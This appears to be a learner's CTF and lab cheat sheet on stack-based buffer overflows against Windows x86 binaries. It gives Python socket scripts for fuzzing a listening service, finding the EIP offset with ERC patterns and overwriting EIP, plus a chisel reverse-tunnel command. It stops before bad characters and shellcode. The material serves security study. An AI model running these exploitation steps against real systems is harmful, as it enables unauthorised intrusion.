# Buffer Overflow - Stack based - Winx86

*For the buffer overflow, you need to take the binary you want to investigate and put it in your own lab to analyse and test it.  
Sometimes for CTF or on CTF platforms you will have to get it from the remote machine.*

## Some advice on how to learn

When I started, I found buffer overflow very hard.  
And today I almost enjoy it ;) :D  

In order to understand it better, here is what I did:

- Checked out Heath Adams video The Cyber Mentor on youtube (completely free, clear and very well explained)
- Completed this with the cours on HTB Academy 
- Finally I practiced on some boxes on TryHackMe

*See links in the resources below*

## Tools

### x64dbg

- [Install instructions](https://github.com/x64dbg/x64dbg)
- [Latest release](https://github.com/x64dbg/x64dbg/releases/tag/snapshot)

### Immunity Debbuger

- If you do not like x64dbg you can use Immunity Debbugger


### ERC

- Plugin for x64gdb
- [Latest release](https://github.com/Andy53/ERC.Xdbg/releases)
- `ERC --help` will show help menu
- `ERC --config SetWorkingDirectory C:\Users\User\directory` Set default working directory

## Set up your testing lab

[](TODO)
- Virtualbox or VMWare
- One kali
- One win

## Methodology

***Note: The scripts provided here are shown as example, you will have to modify them according to the behavior of the binary you are testing***

### 1. Fuzzing parameters

- Remote fuzzing
  - `netstat -a` | to check if the bin listens on a specific port
    ```DOS
    Proto  Local Address          Foreign Address        State
    TCP    0.0.0.0:21449          IEWIN7:0               LISTENING
    ```
   - You will need chisel
     On your attacking machine `./chisel server -reverse`  
     On your victim machine .\chisel.exe client IP-DE-KALI:8080 R:21449:127.0.0.1:21449
   - From your attacking machine
     `.\nc.exe 127.0.0.1 PortNumber` | to interact with the bin remotely
    - Start fuzzing
      ```python
      import socket
      from struct import pack

      IP = "127.0.0.1"
      port = 21449

      def fuzzing():
         try:
             for i in range(0,10000,500):
                 buffer = b"A"*i
                 print("Fuzzing %s bytes" % i)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((IP, port))
                 s.send(buffer)
                 breakpoint() 
                 # To follow in console until you reach the error you can type c and enter
                 s.close()
             except:
                 print("Could not establish a connection")
      fuzzing()
      ```
      Here is how it looks in your console:
      ```bash
      ┌──(kali㉿kali)-[~/Documents/bof]
      └─$ python3 fuzz.py
      Fuzzing 0 bytes
      > /home/kali/Documents/bof-htb/assessment.py(16)fuzzing()
      -> s.close()
      (Pdb) c
      Fuzzing 500 bytes
      > /home/kali/Documents/bof-htb/assessment.py(15)fuzzing()
      -> breakpoint()
      (Pdb)
      ```
      
### Controlling EIP

Once we get the number of bytes, we can fill our buffer with an ASCII pattern.
- In x32dbg
  ```
  ERC --pattern c 500
  ```
  
  Erc will generate a txt with a pattern that will be available in your working directory (if you did not set a working dir, it will probably end up in the plugins folder)
  It should be named "Pattern_Create_1.txt"

- We modify our script accordingly
  ```python
  # fuzzing()
  def eip_offset():
     pattern = bytes("PATTERN-HERE"
     "PATTERN-HERE"
     "PATTERN-HERE"
     "PATTERN-HERE"
     "PATTERN-HERE"
     "PATTERN-HERE" ,"utf-8")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, port))
     s.send(pattern)
     s.close()

  eip_offset()
  ```
  We can now relaunch the program from our debbugger
  The program will crach with the pattern that rewritten EIP.
  In x32debug we can select the address of EIP to calculate the offset we can click on "modify value"  
  ![EIP address](../.res/image37.png)  
  We can then use ERC pattern: `ERC --pattern o pA6p`  
  ![ERC pattern](../.res/image12.png)  
  In the example we can then write that our offset is 469
  We can update our script accordingly
  ```python
  # eip_offset()

  def eip_control():

          offset = 469
          buffer = b"A"*offset
          eip = b"B"*4
          payload = buffer + eip

          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((IP, port))
          s.send(payload)
          s.close()

  eip_control()
  ```
  We can then relaunch the bin with the restart button in x32dbg (Note everytime you rerun the script check that it is running and not paused)
  We can now see that we control EIP because we can see our B (42424242) sent by our script  
  ![ERC pattern](../.res/image27.png)  

### 3. Identifying Bad Characters

We now need another function to identify bad chars.
To get a list of badchars we can use the following command with ERC `ERC --bytearray` we will then get a file intitled `ByteArray_1.txt` in our working directory.

     [](TODO)

## Resources

- [Buffer overflow made easy 2022 Edition - The Cyber Mentor](https://www.youtube.com/watch?v=ncBblM920jw&ab_channel=TheCyberMentor)
- [Buffer Overflows Made Easy - The Cyber Mentor](https://youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G)
- [Stack-Based Buffer Overflows on Windows x86 - HackTheBox Academy](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-windows-x86)
- [Buffer Overflow Prep - THM](https://tryhackme.com/room/bufferoverflowprep)
- [Brainstorm - THM](https://tryhackme.com/room/brainstorm)
- [Brainpan - THM](https://tryhackme.com/room/brainpan)
- [Gatekeeper - THM](https://tryhackme.com/room/gatekeeper)
- [x64dbg](https://github.com/x64dbg/x64dbg)
- [x64dbg releases](https://github.com/x64dbg/x64dbg/releases/tag/snapshot)
- [ERC releases](https://github.com/Andy53/ERC.Xdbg/releases)
